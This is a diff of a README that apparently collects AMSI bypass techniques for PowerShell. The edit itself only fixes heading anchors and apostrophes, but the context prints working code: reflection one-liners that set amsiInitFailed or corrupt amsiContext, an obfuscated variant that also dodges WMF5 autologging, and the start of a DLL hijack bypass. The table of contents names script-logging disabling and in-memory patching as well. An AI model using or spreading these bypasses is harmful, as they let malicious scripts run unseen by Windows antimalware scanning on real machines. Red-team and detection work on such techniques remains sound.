@@ -10,10 +10,10 @@ Some of the more well known Bypasses are detected by AMSI itself. So you have to
 5. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
 6. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
 7. [Same as 4 but integer Bytes instead of Base64](#Same-as-4-but-integer-Bytes-instead-of-Base64 "Goto Same-as-4-but-integer-Bytes-instead-of-Base64")
-8. [Using Matt Graeber's Reflection method](#Using-Matt-Graeber's-Reflection-method "Goto Using-Matt-Graeber's-Reflection-method")
-9. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graeber's-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graeber's-Reflection-method-with-WMF5-autologging-bypass")
-10. [Using Matt Graeber's second Reflection method](#Using-Matt-Graeber's-second-Reflection-method "Goto Using-Matt-Graeber's-second-Reflection-method")
-11. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaa's-DLL-hijack-method "Goto Using-Cornelis-de-Plaa's-DLL-hijack-method")
+8. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+9. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+10. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+11. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
 12. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
 13. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
 
@@ -191,21 +191,21 @@ function MyPatch{
 MyPatch;
 Start-Sleep 1;
 ```
-# Using Matt Graeber's Reflection method #
+# Using Matt Graebers Reflection method #
 ```
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-# Using Matt Graeber's Reflection method with WMF5 autologging bypass #
+# Using Matt Graebers Reflection method with WMF5 autologging bypass #
 ```
 [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
 ```
 
-# Using Matt Graeber's second Reflection method #
+# Using Matt Graebers second Reflection method #
 ```
 [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
 ```
 
-# Using Cornelis de Plaa's DLL hijack method #
+# Using Cornelis de Plaas DLL hijack method #
 ```
 [Byte[]] $temp = $DllBytes -split ' '                
 Write-Output "Executing the bypass."
